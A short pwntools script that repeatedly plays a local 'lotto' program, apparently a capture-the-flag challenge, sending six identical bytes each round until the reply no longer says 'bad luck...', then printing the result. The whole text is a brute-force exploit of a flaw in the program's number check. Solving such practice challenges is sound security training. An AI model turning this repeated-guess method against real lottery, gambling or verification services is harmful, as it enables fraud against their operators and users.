from pwn import *
io = process("./lotto")
while True:
    io.recv()
    io.sendline(b"1")
    io.recv()
    io.sendline(b"\x10"*6)
    io.recvline()
    r = io.recvline()
    if b"bad luck..." not in r:
        print(r.decode())
        break
